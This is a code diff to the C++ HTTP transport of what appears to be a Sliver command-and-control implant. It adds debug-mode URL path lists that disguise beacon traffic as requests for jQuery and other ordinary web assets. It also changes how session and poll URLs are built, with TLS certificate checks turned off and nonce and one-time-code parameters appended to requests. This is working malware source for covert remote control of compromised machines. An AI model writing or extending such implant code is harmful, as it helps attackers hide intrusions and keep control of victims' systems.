@@ -40,10 +40,26 @@ namespace transports {
 
 	string HttpClient::StartSessionURL() {
 		auto s = SessionURL();
-		return s.replace(s.find(".php"), 4, "html");
+		return s.replace(s.find(".php"), 4, ".html");
 	}
 
 	string HttpClient::SessionURL() {
+#ifdef DEBUG
+		std::vector<string>segments = {
+			// 
+			"upload",
+			// 
+			"actions",
+			// 
+		};
+		std::vector<string>filenames = {
+			// 
+			"api",
+			// 
+			"samples",
+			// 
+		};
+#else
 		std::vector<string>segments = {
 			// {{range .HTTPC2ImplantConfig.SessionPaths}}
 			"{{.}}",
@@ -54,7 +70,7 @@ namespace transports {
 			"{{.}}",
 			// {{end}}
 		};
-
+#endif
 		auto elems = RandomPath(segments, filenames, "php");
 		auto ret = std::accumulate(
 			std::next(elems.begin()),
@@ -64,10 +80,35 @@ namespace transports {
 				return a + "/" + b;
 			}
 		);
-		return ret;
+		return this->base_URI + "/" + ret;
 	}
 
 	string HttpClient::PollURL() {
+#ifdef DEBUG
+		std::vector<string>segments = {
+			// 
+			"script",
+			// 
+			"javascripts",
+			// 
+			"javascript",
+			// 
+			"jscript",
+			// 
+			"js",
+			// 
+			"umd",
+			// 
+		};
+		std::vector<string>filenames = {
+			// 
+			"jquery.min",
+			// 
+			"jquery",
+			// 
+		};
+
+#else
 		std::vector<string>segments = {
 			// {{range .HTTPC2ImplantConfig.PollPaths}}
 			"{{.}}",
@@ -78,7 +119,7 @@ namespace transports {
 			"{{.}}",
 			// {{end}}
 		};
-
+#endif
 		auto elems = RandomPath(segments, filenames, "php");
 		auto ret = std::accumulate(
 			std::next(elems.begin()),
@@ -123,15 +164,11 @@ bool HttpClient::SessionInit() {
 
 		auto now_utc = toUTC(std::chrono::system_clock::now());
 		auto totp = crypto::GetTOTP(now_utc+this->timeDelta);		
-		//TODO modify path generation with random mechanism
-#ifdef DEBUG
-		auto path = string("/authenticate/rpc.html") + string("?n=") + to_string(nonce) + string("&op=") + to_string(totp);
-		auto URI = this->base_URI + path;
-#else
+
 		auto URI = this->StartSessionURL();
-#endif
+
 		session->SetVerifySsl(cpr::VerifySsl{ false });
-		session->SetUrl(cpr::Url{ URI });
+		session->SetUrl(cpr::Url{ URI + string("?n=") + to_string(nonce) + string("&op=") + to_string(totp) });
 		session->SetBody(cpr::Body{ encoded });
 		cpr::Response resp = session->Post();
 		if (resp.status_code == 0) {
@@ -234,12 +271,9 @@ unique_ptr<sliverpb::Envelope> HttpClient::ReadEnvelope() {
 	if (this->sessionID.compare("") == 0) {
 		return nullptr;
 	}
-#ifdef DEBUG
-	string path{ "/jscript/bootstrap.js" };
-	auto URI = this->base_uri + path;
-#else
+
 	auto URI = this->PollURL();
-#endif
+
 	auto tp = encoders::GetRandomEncoder();
 	unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
 	auto nonce = std::get<0>(tp);
